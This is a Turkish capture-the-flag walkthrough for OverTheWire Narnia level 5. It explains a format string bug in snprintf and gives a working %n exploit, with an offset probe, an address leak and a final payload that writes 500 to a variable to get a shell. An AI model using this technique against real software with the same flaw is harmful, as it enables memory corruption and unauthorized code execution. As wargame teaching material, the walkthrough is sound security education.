# 💥 OverTheWire Narnia — Level 5 → Level 6
## Format String Saldırısı: `%n` ile Belleğe Yazma

> Buffer overflow dünyasından çıktık. Burada `snprintf`'in **format string**'ini
> biz kontrol ediyoruz — ve format string açıkları sayesinde stack'i okuyup
> (`%x`) hatta **belleğe yazabiliyoruz** (`%n`). Hedef: `i` değişkenini 1'den
> 500'e çıkarmak. Tek kurşunla, doğru adrese 500 yazacağız.

| | |
|---|---|
| **Bağlantı** | `ssh narnia5@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia5.c` · binary: `/narnia/narnia5` |
| **Kavram** | Format string açığı → `%n` ile keyfi adrese yazma |
| **Zorluk** | ⭐⭐⭐⭐☆ |

**Bu level için gereken konular:**
- [`05_format_string.md`](../../konu_anlatimlari/binary_exploitation/05_format_string.md) — `%x`/`%n`, format string mantığı (önce bunu oku!)
- [`02_little_endian.md`](../../konu_anlatimlari/binary_exploitation/02_little_endian.md) — hedef adresi ters yazmak

---

## 🎯 Hedef

`i` değişkeni `1` ile başlıyor ve hiçbir yerde değiştirilmiyor. Ama `i == 500` olursa program shell veriyor. Elimizde format string'ini kontrol ettiğimiz bir `snprintf` var; `%n` ile `i`'nin adresine `500` yazıp shell'i açacağız.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);   // ← AÇIK: format string kontrolü sende
    buffer[sizeof (buffer) - 1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i == 500){
        printf("GOOD\n");
        system("/bin/sh");                       // ← ödül
    }

    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf("i = %d (%p)\n", i, &i);              // ← HEDİYE: i'nin adresini söylüyor!
    return 0;
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık Nerede?

```c
snprintf(buffer, sizeof buffer, argv[1]);
```

Doğrusu `snprintf(buffer, sizeof buffer, "%s", argv[1])` olmalıydı. Burada `argv[1]` doğrudan **format string** olarak veriliyor. Yani kullanıcı (biz) format specifier'ları enjekte edebiliriz:

- `%x` → stack'ten bir değer okuyup yazar (bellek **sızdırma**).
- `%n` → o ana kadar yazdırılan **byte sayısını**, argüman olarak verilen adrese **yazar** (bellek **yazma**!).

İki önemli gözlem:

- **Program bize `i`'nin adresini hediye ediyor:** `printf("i = %d (%p)\n", i, &i)` her (çökmeyen) çalıştırmada `&i`'yi basıyor. Yani adresi tahmin etmemize gerek yok, okuyacağız.
- **`snprintf` taşmaya karşı güvenli** (`sizeof` derleme anında sabit, `strlen` gibi kandırılamaz) — yani burada buffer overflow YOK. Saldırı tamamen format string üzerinden.

> 💡 **`snprintf` 64 byte'a kırpıyor ama `%n` yine de TAM sayacı alır.** Test ettim: `snprintf(buf, 64, "AAAA%.496x%n", 0, &n)` çağrısında `buffer` 63 karaktere kırpılsa da `n = 500` çıkıyor (glibc, `%n`'e giden sayaç kırpılmaz). İşte bu yüzden 64 byte'lık buffer'a rağmen `%.496x` ile 500 yazabiliyoruz.

---

## 📚 Gereken Teori (özet)

**Format string yazma (`%n`).** `%n`, o ana kadar **basılan toplam byte sayısını**, ilgili argümanın gösterdiği adrese `int` olarak yazar. Eğer o argümanı biz kontrol edersek (adresini biz koyarsak), istediğimiz adrese istediğimiz sayıyı yazabiliriz.

**Konumsal argümanlar (`%k$n`).** `%5$n`, "5. argüman pozisyonundaki adrese yaz" demektir. Format string'imiz (`argv[1]`) stack'te bir yere kopyalanır; o "5. pozisyon" bizim girdimizin başına denk gelirse, oraya koyduğumuz adres `%5$n`'in hedefi olur.

**Genişlik ile sayıyı şişirmek.** `%.496x` → bir değeri en az 496 hane olacak şekilde basar → 496 byte "yazılmış" sayılır. Başına 4 byte'lık adresi de koyunca toplam `4 + 496 = 500` → `%n` bunu hedefe yazar.

Detay için → [`05_format_string.md`](../../konu_anlatimlari/binary_exploitation/05_format_string.md).

---

## 🧪 Adım Adım

### Adım 1 — Girdimiz kaçıncı argüman pozisyonunda? (offset bul)

Başına `AAAA` koyup birkaç `%x` basarak, `41414141` ("AAAA") kaçıncı `%x`'te görünüyor bakarız:

```bash
narnia5@narnia:/narnia$ ./narnia5 'AAAA%x.%x.%x.%x.%x.'
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAAf7eb7746.ffffffff.ffffd6ae.f7e2fc34.41414141.] (49)
i = 1 (0xffffd6c0)        # ← bu UZUN payload için &i = 0xffffd6c0 (Adım 2'deki 14-byte payload'da FARKLI çıkacak!)
```

`41414141` **5.** `%x`'te çıktı → **offset = 5**. Yani girdimizin başı 5. argüman pozisyonunda.

> ⚠️ Offset binary'e/derlemeye göre değişebilir (kimi kurulumda 1, kimisinde 5). **Kendin doğrula** — `41414141` kaçıncı `%x`'te çıkıyorsa o.

### Adım 2 — `i`'nin adresini DOĞRU uzunlukta sızdır

Önemli tuzak: **`&i`'nin değeri `argv[1]`'in uzunluğuna göre kayar** (stack, exec anında argv uzunluğuna göre yerleşir). Bu yüzden adresi, **nihai payload ile aynı uzunlukta** bir çalıştırmada okumalıyız.

Ama nihai payload `%5$n` (yazma) içeriyor — onu sahte bir adresle çalıştırırsan **segfault** olur ve `i = ...` satırını hiç göremezsin. Çözüm: aynı uzunlukta ama **yazmayan** bir payload kullan — `%5$n` yerine `%5$x` (okur, çökmez):

```bash
# Nihai payload ile AYNI uzunluk (14 byte), ama %5$x → sadece okur, çökmez
narnia5@narnia:/narnia$ ./narnia5 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"BBBB" + b"%.496x%5$x")')"
...
i = 1 (0xffffd6cc)        # ← bu UZUNLUK için &i = 0xffffd6cc  (nihai payload ile aynı)
```

### Adım 3 — `BBBB` yerine sızdırdığın adresi koy, `%5$x` → `%5$n`

`0xffffd6cc` → little-endian → `\xcc\xd6\xff\xff`. Sayım: 4 (adres) + `%.496x` (496) = 500 → `%5$n` bunu `&i`'ye yazar.

---

## ▶️ Çalıştırma

```bash
narnia5@narnia:/narnia$ ./narnia5 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xcc\xd6\xff\xff" + b"%.496x%5$n")')"
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
<şifre buraya gelir>
```

`i` 500 oldu, program shell verdi. Şifreyi al, narnia6'ya geç.

---

## ⚠️ Yaygın Hatalar / Tuzaklar

**1. `&i`'yi `%5$n` ile sızdırmaya çalışmak (klasik tuzak).**
`%5$n` belleğe **yazar**; sahte bir adresle (BBBB → `0x42424242`) çalıştırınca segfault olur ve `i = ...` satırını göremezsin. Sızdırma için **`%5$x`** (okuma) kullan — değer pozisyonu okur, yazmaz, çökmez.

**2. `&i`'yi yanlış uzunlukta okumak.**
`./narnia5 AAAA` ile gördüğün adres (kısa argüman) nihai payload'da (uzun argüman) genelde TUTMAZ. Adresi **nihai payload ile aynı byte uzunlukta** bir çalıştırmada oku.

**3. Adres yine de tutmazsa (kayma).**
GDB ve gerçek çalıştırma ya da küçük uzunluk farkları nedeniyle `i` değişip de 500 olmuyorsa, sızdırdığın adresi birkaç byte aşağı/yukarı dene (`0xffffd6c8`, `0xffffd6cc`, `0xffffd6d0`...).

**4. Offset'i sabit varsaymak.** `41414141` kaçıncı `%x`'te çıkıyorsa offset o; binary'e göre değişir.

**5. `print()` ile adres byte'ları göndermek.** `\xcc\xd6\xff\xff` bozulur → `sys.stdout.buffer.write(b"...")`.

> 💡 İki teknik incelik (glibc'de sorun çıkarmaz): (1) `snprintf` çıktıyı 64 byte'a kırpar ama `%n` tam değeri (500) alır — *yukarıda test ettik*; (2) konumlu `%5$n` ile konumsuz `%.496x` karıştırmak teknik olarak tanımsız davranıştır (UB) ama glibc bunu beklendiği gibi çalıştırır.

---

## ✅ Ne Öğrendik

- `printf(input)` / `snprintf(buf, n, input)` gibi **kullanıcı kontrollü format string** ciddi bir açıktır: `%x` ile okur, `%n` ile **yazarsın**.
- `%k$n` (konumlu) ile girdinin başına koyduğun adrese yazarsın; genişlik (`%.Nx`) ile yazacağın sayıyı ayarlarsın.
- glibc'de `snprintf` buffer'ı kırpsa da `%n` **tam sayacı** alır → küçük buffer'a rağmen büyük değer yazılabilir.
- Stack adresleri `argv` uzunluğuna bağlı olduğu için, sızdırmayı **nihai payload uzunluğunda** ve **yazmayan** (`%x`) bir çalıştırmayla yapmak gerekir.

Bir sonraki level format string'i bırakıp tekrar overflow'a dönüyor ama yeni bir koruma ile: stack'e atlayamıyoruz (`get_sp` kontrolü), o yüzden **return-to-libc** ile `system()`'i çağıracağız.

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 4 → Level 5 — Ortam Temizlenmiş Overflow](./narnia_4-5.md)
- **Sonraki:** [Level 6 → Level 7 — Return-to-libc + Fonksiyon Pointer](./narnia_6-7.md)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
